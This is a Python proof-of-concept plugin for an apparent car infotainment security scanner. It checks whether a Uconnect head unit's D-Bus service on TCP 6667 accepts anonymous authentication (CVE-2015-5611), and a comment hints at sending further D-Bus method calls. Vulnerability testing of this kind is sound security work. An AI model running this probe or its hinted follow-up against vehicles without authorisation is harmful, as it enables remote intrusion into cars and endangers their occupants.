"""
PoC Name: D-Bus Anonymous Authentication
CVE: CVE-2015-5611
Component: Network Stack
Category: Network
Severity: Critical
CVSS: 9.0
Description: D-Bus服务通过TCP:6667接受匿名认证
Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
Usage: python 17_DBus_Anon_Auth.py <target_ip>
"""
import socket
import sys
from iv_plugin_base import IVIVulnerabilityPlugin

class JeepDBusPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-010"
    meta_poc_name = "DBus Anon Auth"
    meta_cve_id = "N/A"
    meta_severity = "Critical"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def __init__(self, target_config, logger=None):
        super().__init__(target_config, logger)
        self.target_port = 6667
        self.results["cve_id"] = "CVE-2015-5611"

    def check_prerequisites(self):
        return True

    def exploit(self):
        self.logger.info(f"Connecting to Uconnect D-Bus on {self.target_ip}:6667...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.target_ip, self.target_port))
            
            # D-Bus 握手：发送 0 字节
            s.send(b'\x00') 
            
            # 尝试匿名认证
            self.logger.info("Sending AUTH ANONYMOUS...")
            s.send(b"AUTH ANONYMOUS\r\n")
            
            res = s.recv(1024)
            self.logger.info(f"Response: {res}")
            
            if b"OK" in res:
                self.results["vulnerable"] = True
                self.results["evidence"] = "D-Bus accepted Anonymous Authentication."
                # 进一步利用可以发送: BEGIN\r\n 然后调用方法
            else:
                self.results["vulnerable"] = False
                self.results["evidence"] = "D-Bus authentication rejected."
                
            s.close()
        except ConnectionRefusedError:
            self.results["vulnerable"] = False
            self.results["evidence"] = "Port 6667 closed."
        except Exception as e:
            self.logger.error(f"Error: {e}")
            self.results["vulnerable"] = False
            
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python 17_DBus_Anon_Auth.py <target_ip>")
        sys.exit(1)
    plugin = JeepDBusPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
